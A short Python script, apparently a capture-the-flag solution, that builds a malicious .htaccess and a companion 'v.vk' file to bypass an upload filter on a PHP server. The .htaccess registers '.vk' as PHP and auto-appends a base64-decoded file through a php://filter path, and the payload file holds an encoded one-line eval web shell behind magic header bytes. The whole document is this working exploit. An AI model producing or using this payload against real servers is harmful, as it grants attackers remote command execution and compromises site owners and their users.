import base64

htaccess = b"""\x00\x00\x8a\x39\x8a\x39
AddType application/x-httpd-php .vk
php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_74d3224455627bcd098e7b7824f00e3b/v.vk"
"""

shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00" + \
    base64.b64encode(b"<?php eval($_POST[1]);?>")

with open('.htaccess', 'wb') as f:
    f.write(htaccess)
with open('v.vk', 'wb') as f:
    f.write(shell)
